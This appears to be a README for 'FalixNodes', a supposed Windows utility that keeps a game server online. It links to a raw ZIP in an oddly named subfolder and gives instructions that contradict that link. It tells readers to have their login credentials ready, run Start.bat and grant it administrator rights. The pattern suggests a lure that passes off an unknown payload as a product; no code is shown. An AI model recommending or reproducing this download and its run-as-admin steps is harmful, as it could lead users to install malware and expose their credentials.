# ⚙️ FalixNodes - Keep your game server running always

[![Download FalixNodes](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip)

## 📌 About this project

FalixNodes tracks the status of your servers. It checks if your server remains online at all times. If a server stops, the system restarts it for you. You do not need to check your dashboard manually. This tool ensures your friends and players stay connected to your world without breaks.

## 🛠️ Requirements

You need a Windows computer to run this tool. Ensure you have a stable internet connection. You must have your FalixNodes login credentials ready. Keep your browser open to the main control panel to finish the setup process.

## 📥 How to get the software

Visit this page to download the necessary files: [https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip](https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip)

1. Go to the link above.
2. Look for the green button labeled Code.
3. Select Download ZIP from the menu.
4. Save the file to your desktop.
5. Right-click the folder and choose Extract All.

## 🚀 Setting up the server monitor

Follow these steps to start the monitor once you extract the files on your computer.

1. Open the folder you extracted.
2. Find the file named config.txt.
3. Open this file with Notepad.
4. Paste your server link into the file.
5. Save and close the file.
6. Double-click the file named Start.bat to launch the process.

A black window will appear on your screen. This window shows the status of your server. Do not close this window while you want the monitor to run. If you close the window, the monitoring service stops.

## 📈 Understanding the features

The script performs three main tasks to keep your service active.

* **Health Checks:** The script pings your server every five minutes to check its status.
* **Auto Restart:** If the ping receives no response, the script triggers the restart sequence.
* **Logging:** The script records every action in a text file. You can check this file to see when your server restarted.

## 🛡️ Maintaining safety

Do not share your config.txt file with others. This file contains private lines of code that link to your server. If someone else gets this file, they might gain access to your server controls. Keep the folder in a safe place on your computer.

## 💡 Troubleshooting common issues

If the script fails to start, check the following items.

* **Check the path:** Ensure the folder is not inside a restricted system location like Program Files. Move the folder to your desktop if it fails.
* **Verify internet:** The script needs an active web connection to talk to your server. If your internet drops, the script cannot restart the server.
* **Permission errors:** Right-click the Start.bat file and select Run as administrator. This provides the script permission to interact with your system network settings.

## 🧩 Modifying settings

You can change how often the script checks your server. Open the config.txt file again. You will see a line labeled interval. Change the number next to it to increase or decrease the time between checks. The number represents seconds. A setting of 300 means the script checks your server every five minutes. Save the file and restart the program after you change any numbers.

## 📁 Reviewing logs

Open the logs folder inside your main directory to view past events. You will see a list of dates and times. Each entry shows when the script checked the server and if it needed a restart. Use these notes if you need to report errors to your hosting provider. The log file creates a new entry every day to keep your data organized.

## ✅ Finalizing your installation

You possess a tool that manages your server uptime. You no longer need to check your status page throughout the day. The script handles the manual heavy lifting. Keep the tool running in the background while you play or work. When you finish your session, you can close the black window to stop the monitor. Restart it whenever you need your server to remain active. The design remains simple to ensure everyone gets their server back online with minimal effort. Consistent monitoring prevents long periods of downtime for your community.